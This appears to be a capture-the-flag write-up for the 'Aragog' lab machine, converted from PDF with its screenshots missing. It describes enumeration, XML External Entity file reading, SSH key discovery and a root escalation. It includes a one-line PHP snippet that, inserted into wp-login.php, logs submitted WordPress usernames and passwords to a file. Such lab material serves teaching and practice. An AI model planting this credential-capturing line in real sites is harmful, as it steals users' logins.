# Aragog

*Converted from: Aragog.pdf*

---

# Aragog
## **21 [st] July 2018 / Document No D18.100.12**

**Prepared By: Alexander Reid (Arrexel)**

**Machine Author: egre55**

**Difficulty: Medium**

**Classification: Official**



Page 1 / 7


## **SYNOPSIS**

Aragog is not overly challenging, however it touches on several common real-world

vulnerabilities, techniques and misconfigurations.


## **Skills Required**


  - Intermediate knowledge of Linux


## **Skills Learned**


  - Exploiting XML External Entities

  - Enumerating files through XXE

  - Exploiting weak file permissions


Page 2 / 7


## **Enumeration** **Nmap**

Nmap reveals vsftpd (which has anonymous login enabled), OpenSSH and Apache.



Page 3 / 7


​


## **Dirbuster**

Dirbuster finds only a **hosts.php** ​ file.



​



​


Page 4 / 7


​


​


## **Exploitation** **XML External Entities**

Attempting to connect to FTP reveals only a **test.txt** ​ file which contains some basic XML.


Sending the XML in a POST request to **hosts.php** ​ results in some different output.


Using this, it is trivial to craft a request that abuses external entities to read files on the system.


Page 5 / 7



​


​



​


​



​


​


​

​



After obtaining **/etc/passwd** ​ through the XXE vulnerability, two home directories are discovered;

​



​

**florian** and **cliff** ​ . As OpenSSH is explicitly set to allow only publickey authentication, it can be



​

​

taken as a hint that the private key may be left on the machine. The path is easy to guess, but it



​

​


can be brute forced with a simple script.



​

​



​

​



​

​


Page 6 / 7


​

​ ​


​

​ ​

​


​


## **Privilege Escalation** **Web Server Write Access**

Automated enumeration tools are not necessary to find the correct escalation vector in this case.

As this is a CTF system, any type of user interaction must be automated. Running **ps aux** ​ reveals

a **whoopsie** ​ user running **/usr/bin/whoopsie** ​ . This binary can be reverse engineered (much more

challenging) to obtain the SUDO password. The purpose of this binary is to simulate a user

logging into the Wordpress installation at **[http://aragog/dev_wiki](http://aragog/dev_wiki)** ​


​ ​

​


​



​

​ ​


​


Since the entire **/var/www/html** ​ directory is chmod 777, it is possible to modify **wp-login.php** ​ to

​


​



​

​ ​


​

​ ​

capture any supplied credentials. The login credentials are sent in **$_POST[‘log’]** ​ and


​



​

​ ​


​

​ ​

​

**$_POST[‘pwd’]** . Simple adding the following line after the <?php tag is enough.


​



​

​ ​


​

​ ​

​


file_put_contents("creds.txt",$_POST['log']." - ".$_POST['pwd']);


Reusing the Wordpress password with **su** ​ will grant a root shell.



​

​ ​


​

​ ​

​


​



​

​ ​


​

​ ​

​


​


Page 7 / 7


